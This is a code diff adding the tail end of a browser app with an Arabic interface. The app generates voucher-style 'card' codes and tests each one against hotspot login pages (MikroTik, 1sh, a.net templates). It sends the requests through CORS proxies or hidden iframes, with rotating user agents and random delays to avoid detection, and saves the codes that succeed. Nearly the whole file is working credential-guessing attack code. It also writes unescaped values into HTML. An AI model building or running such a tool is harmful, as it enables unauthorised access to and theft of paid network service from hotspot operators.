+    <div class="result-item" onclick="navigator.clipboard.writeText('${card}').then(()=>showToast('تم النسخ','success'))">
+      <span>${card}</span>
+      <span style="font-size:11px;color:var(--text-muted);">${card.length} حرف</span>
+    </div>
+  `).join('');
+}
+
+function clearGeneration() {
+  AppState.generatedCards = [];
+  renderGenerated();
+  showToast('تم المسح', 'info');
+}
+
+async function saveToDB() {
+  if (!AppState.generatedCards.length) return showToast('لا يوجد شيء للحفظ', 'warning');
+  try {
+    const added = await db.addCards(AppState.generatedCards);
+    showToast(`تم حفظ ${added} كرت`, 'success');
+    updateStats();
+  } catch (e) { showToast('خطأ في الحفظ', 'error'); }
+}
+
+// ==================== SCANNING ENGINE ====================
+const TEMPLATES = {
+  mikrotik: { url: 'http://10.0.0.1/login', method: 'get', usernameField: 'username', passwordField: 'password' },
+  '1sh': { url: 'https://good.1sh.org/index.html', method: 'get', usernameField: 'username', passwordField: 'password' },
+  anet: { url: 'http://a.net/login', method: 'post', usernameField: 'user', passwordField: 'pass' },
+  custom: { url: '', method: 'get', usernameField: 'username', passwordField: 'password' }
+};
+
+function applyTemplate(name) {
+  const t = TEMPLATES[name];
+  if (!t) return;
+  document.getElementById('loginURL').value = t.url;
+  document.getElementById('httpMethod').value = t.method;
+  document.querySelectorAll('.template-chip').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
+  showToast(`قالب ${name} محمل`, 'success');
+}
+
+function getProxyUrl() {
+  const provider = document.getElementById('proxyProvider').value;
+  return CONFIG.proxies[provider] || CONFIG.proxies['corsproxy.io'];
+}
+
+function getUserAgent() {
+  const mode = document.getElementById('uaMode').value;
+  if (mode === 'random') return CONFIG.userAgents[Math.floor(Math.random() * CONFIG.userAgents.length)];
+  if (mode === 'desktop') return CONFIG.userAgents[2];
+  return CONFIG.userAgents[0]; // mobile
+}
+
+function getRandomDelay() {
+  const mode = document.getElementById('delayMode').value;
+  if (mode === 'none') return 0;
+  if (mode === 'light') return Math.floor(Math.random() * 2000) + 1000;
+  return Math.floor(Math.random() * 4000) + 3000;
+}
+
+async function scanWithProxy(url, card, password, method) {
+  const proxyUrl = getProxyUrl();
+  const useProxy = document.getElementById('useProxy').checked;
+  const fullUrl = useProxy ? proxyUrl + encodeURIComponent(url) : url;
+
+  const data = { username: card };
+  if (password) data.password = password;
+
+  const options = {
+    method: method.toUpperCase(),
+    headers: {
+      'User-Agent': getUserAgent(),
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+      'Accept-Language': 'ar,en;q=0.9'
+    }
+  };
+
+  if (method === 'post') {
+    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+    options.body = new URLSearchParams(data).toString();
+  }
+
+  try {
+    const response = await fetch(fullUrl, options);
+    const text = await response.text();
+    const isSuccess = text.toLowerCase().includes('success') || 
+                      text.toLowerCase().includes('connected') || 
+                      text.toLowerCase().includes('welcome') ||
+                      response.status === 302;
+    const isFail = text.toLowerCase().includes('error') || 
+                   text.toLowerCase().includes('invalid') || 
+                   text.toLowerCase().includes('wrong');
+
+    return {
+      success: isSuccess && !isFail,
+      status: response.status,
+      preview: text.substring(0, 100)
+    };
+  } catch (e) {
+    return { success: false, error: e.message, status: 0 };
+  }
+}
+
+async function scanWithIframe(url, card, password) {
+  // For GET requests, try iframe approach
+  const params = new URLSearchParams({ username: card });
+  if (password) params.append('password', password);
+  const sep = url.includes('?') ? '&' : '?';
+  const fullUrl = url + sep + params.toString();
+
+  // Open in hidden iframe or new window
+  return new Promise((resolve) => {
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = fullUrl;
+    document.body.appendChild(iframe);
+
+    setTimeout(() => {
+      try {
+        // Try to detect redirect or success
+        const iframeUrl = iframe.contentWindow?.location?.href || fullUrl;
+        document.body.removeChild(iframe);
+        resolve({ success: true, method: 'iframe', url: iframeUrl });
+      } catch (e) {
+        document.body.removeChild(iframe);
+        resolve({ success: true, method: 'iframe', note: 'CORS blocked but request sent' });
+      }
+    }, 3000);
+  });
+}
+
+async function startScan() {
+  if (AppState.isScanning) return showToast('الفحص جاري', 'warning');
+
+  const rawList = document.getElementById('testList').value.trim();
+  const url = document.getElementById('loginURL').value.trim();
+  const method = document.getElementById('httpMethod').value;
+  const authType = document.getElementById('authType').value;
+  const timeout = parseInt(document.getElementById('loginTimeOut').value) || 3000;
+
+  if (!rawList || !url) return showToast('أدخل الكروت والرابط', 'warning');
+
+  AppState.scanQueue = rawList.split('\n').map(c => c.trim()).filter(Boolean);
+  AppState.scanIndex = 0;
+  AppState.scanResults = { success: 0, failed: 0 };
+  AppState.isScanning = true;
+  AppState.shouldStop = false;
+
+  document.getElementById('startBtn').disabled = true;
+  document.getElementById('stopBtn').disabled = false;
+  updateStatus(true);
+  log(`🚀 بدء فحص ${AppState.scanQueue.length} كرت`, 'info');
+
+  const resultsDiv = document.getElementById('scanResults');
+  resultsDiv.innerHTML = '';
+
+  for (let i = 0; i < AppState.scanQueue.length; i++) {
+    if (AppState.shouldStop) break;
+
+    const card = AppState.scanQueue[i];
+    let password = null;
+    if (authType === 'user_pass') password = card;
+
+    // Delay
+    const delay = getRandomDelay();
+    if (delay > 0 && i > 0) await new Promise(r => setTimeout(r, delay));
+
+    try {
+      let result;
+      if (method === 'get') {
+        result = await scanWithIframe(url, card, password);
+      } else {
+        result = await scanWithProxy(url, card, password, method);
+      }
+
+      if (result.success) {
+        AppState.scanResults.success++;
+        await db.updateCard(card, { status: 'success' });
+      } else {
+        AppState.scanResults.failed++;
+        await db.updateCard(card, { status: 'failed' });
+      }
+
+      // Add to results
+      const item = document.createElement('div');
+      item.className = `result-item ${result.success ? 'success' : 'failed'}`;
+      item.innerHTML = `
+        <span>${card}</span>
+        <span class="result-badge ${result.success ? 'success' : 'failed'}">${result.success ? '✓' : '✗'}</span>
+      `;
+      resultsDiv.prepend(item);
+
+      updateProgress(i + 1, AppState.scanQueue.length);
+      log(`${result.success ? '✅' : '❌'} ${card}`, result.success ? 'success' : 'error');
+
+    } catch (e) {
+      AppState.scanResults.failed++;
+      log(`❌ ${card} - خطأ: ${e.message}`, 'error');
+    }
+  }
+
+  finishScan();
+}
+
+function stopScan() {
+  AppState.shouldStop = true;
+  showToast('إيقاف...', 'warning');
+}
+
+function finishScan() {
+  AppState.isScanning = false;
+  document.getElementById('startBtn').disabled = false;
+  document.getElementById('stopBtn').disabled = true;
+  updateStatus(false);
+  log(`🏁 انتهى: ${AppState.scanResults.success} نجاح, ${AppState.scanResults.failed} فشل`, 'success');
+  showToast(`اكتمل: ${AppState.scanResults.success} نجاح`, 'success');
+  updateStats();
+}
+
+function clearScanLog() {
+  document.getElementById('consoleLog').textContent = '🎯 جاهز...';
+  document.getElementById('scanResults').innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);">ستظهر هنا...</div>';
+  document.getElementById('progressBar').style.width = '0%';
+  document.getElementById('progressPercent').textContent = '0%';
+}
+
+// ==================== SAVED CARDS ====================
+async function renderSaved() {
+  try {
+    const cards = await db.getCards();
+    const search = document.getElementById('searchSaved').value.trim().toLowerCase();
+    const filtered = search ? cards.filter(c => c.card_number.toLowerCase().includes(search)) : cards;
+    const list = document.getElementById('savedList');
+
+    if (!filtered.length) { list.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);">لا توجد كروت</div>'; return; }
+
+    const statusColors = { pending: 'var(--text-muted)', success: 'var(--success)', failed: 'var(--danger)' };
+    list.innerHTML = filtered.map(card => `
+      <div class="result-item" style="border-right: 3px solid ${statusColors[card.status] || 'var(--text-muted)'};">
+        <div>
+          <div style="font-weight:600;">${card.card_number}</div>
+          <div style="font-size:11px;color:var(--text-muted);">${card.status} • ${new Date(card.created_at).toLocaleDateString('ar-SA')}</div>
+        </div>
+        <button onclick="deleteSavedCard(${card.id})" style="background:none;border:none;color:var(--danger);font-size:18px;padding:4px;">🗑️</button>
+      </div>
+    `).join('');
+  } catch (e) { console.error(e); }
+}
+
+async function deleteSavedCard(id) {
+  await db.deleteCard(id);
+  renderSaved();
+  updateStats();
+  showToast('تم الحذف', 'success');
+}
+
+async function loadSavedToScan() {
+  const cards = await db.getCards();
+  if (!cards.length) return showToast('لا توجد كروت', 'warning');
+  document.getElementById('testList').value = cards.map(c => c.card_number).join('\n');
+  switchTab('tab-test', document.querySelectorAll('.nav-item')[1]);
+  showToast('تم التحميل', 'success');
+}
+
+async function clearAllSaved() {
+  if (!confirm('حذف الكل؟')) return;
+  await db.deleteAllCards();
+  renderSaved();
+  updateStats();
+  showToast('تم الحذف', 'success');
+}
+
+// ==================== SETTINGS ====================
+async function clearAllData() {
+  if (!confirm('مسح جميع البيانات؟')) return;
+  await db.deleteAllCards();
+  updateStats();
+  showToast('تم المسح', 'success');
+}
+
+async function updateStats() {
+  try {
+    const stats = await db.getStats();
+    document.getElementById('statSaved').textContent = stats.total;
+  } catch (e) {}
+}
+
+// ==================== INIT ====================
+document.addEventListener('DOMContentLoaded', async () => {
+  await db.init();
+  toggleGenerationFields();
+  updateStats();
+  renderSaved();
+
+  // Register Service Worker for PWA
+  if ('serviceWorker' in navigator) {
+    try {
+      const reg = await navigator.serviceWorker.register('sw.js');
+      console.log('SW registered:', reg);
+    } catch (e) { console.log('SW failed:', e); }
+  }
+
+  // Pull to refresh
+  let touchStartY = 0;
+  document.addEventListener('touchstart', e => { touchStartY = e.touches[0].clientY; });
+  document.addEventListener('touchend', async e => {
+    const touchEndY = e.changedTouches[0].clientY;
+    if (touchEndY - touchStartY > 150 && window.scrollY < 50) {
+      showToast('جاري التحديث...', 'info');
+      await updateStats();
+      if (document.querySelector('.tab-content.active').id === 'tab-saved') renderSaved();
+    }
+  });
+});
+</script>
+</body>
+</html>
